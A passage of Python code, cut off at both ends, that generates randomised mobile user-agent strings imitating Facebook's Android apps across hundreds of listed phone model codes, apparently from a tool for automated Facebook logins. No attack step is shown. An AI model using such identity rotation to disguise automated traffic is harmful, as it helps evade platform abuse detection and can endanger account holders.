5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36"]
##############################
strvrun = random.randint
uacrot =[f"Mozilla/5.0 (Linux; Android {str(strvrun(1,5))}.1.1; SM-J111F Build/LMY47V; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.0.0.1 Chrome/{str(strvrun(10,55))}.0.2883.91 Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(strvrun(1,4))}.{str(strvrun(1,4))}.{str(strvrun(1,4))}; SM-J110H Build/KTU84P; pt-pt) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(10,42))}.0.2311.135 Mobile Safari/537.36 Puffin/6.0.7.15747AP"]
##############################
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH2201", "CPH2195", "CPH2263", "CPH2293", "CPH3103", "CPH3155", "CPH2219", "CPH2127", "CPH2251", "CPH2015", "CPH1969", "CPH2213", "CPH2217", "CPH2235", "CPH2211", "CPH2125", "CPH1729", "CPH1983", "CPH1609", "CPH1701"])
	device_vivo = random.choice(["V2123A", "V2118A", "V2069A", "V2068A", "V2065A", "V2063A", "V2062A", "V2059A", "V2058A", "V2057A", "V2056A", "V2055A", "V2054A", "V2053A", "V2052A", "V2051A", "V2050A", "V2048A", "V2047A", "V2045A"])
	device_samsung = random.choice(["SM-A225F", "SM-A326B", "SM-A526B", "SM-A725F", "SM-A908B","SM-T500", "SM-T720", "SM-T860", "SM-T970", "SM-T976B","SM-F127G", "SM-F426B", "SM-F707B", "SM-F916U", "SM-F7110","SM-N960F", "SM-N986B", "SM-N990F", "SM-N975F", "SM-N986U"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX3366", "RMX3391", "RMX3381", "RMX3376", "RMX3375", "RMX3371", "RMX3370", "RMX3369", "RMX3361", "RMX3360", "RMX3357", "RMX3356", "RMX3355", "RMX3352", "RMX3351", "RMX3350", "RMX3347", "RMX3346", "RMX3345", "RMX3341"])
	device_gt = random.choice(["GT-I9500","GT-I9300","GT-N7100","GT-S7580","GT-S5360","GT-P5210","GT-I9195","GT-P5100","GT-S5830","GT-I9100","GT-N8000","GT-P3100","GT-I8190","GT-S6102"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	uaa = f"Mozilla/5.0 (Linux; Android {android}; {device_gt}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,111))}.0.{str(rr(0,5999))}.{str(rr(0,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,399))}.0.0.{str(rr(30,90))}.{str(rr(100,150))};]"
	uab = f"Mozilla/5.0 (Linux; Android {android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,111))}.0.{str(rr(0,5999))}.{str(rr(0,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,399))}.0.0.{str(rr(30,90))}.{str(rr(100,150))};]"
	uac = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,111))}.0.{str(rr(0,5999))}.{str(rr(0,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,399))}.0.0.{str(rr(30,90))}.{str(rr(100,150))};]"
	uad = f"Mozilla/5.0 (Linux; Android {android}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,111))}.0.{str(rr(0,5999))}.{str(rr(0,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,399))}.0.0.{str(rr(30,90))}.{str(rr(100,150))};]"
	uae = f"Mozilla/5.0 (Linux; Android {android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,111))}.0.{str(rr(0,5999))}.{str(rr(0,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,399))}.0.0.{str(rr(30,90))}.{str(rr(100,150))};]"
	ua = str(rc([uaa,uab,uac,uad,uae]))
	if ua in ugent:pass
	else:ugent.append(ua)

strv666=[]
for xd in range(1000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 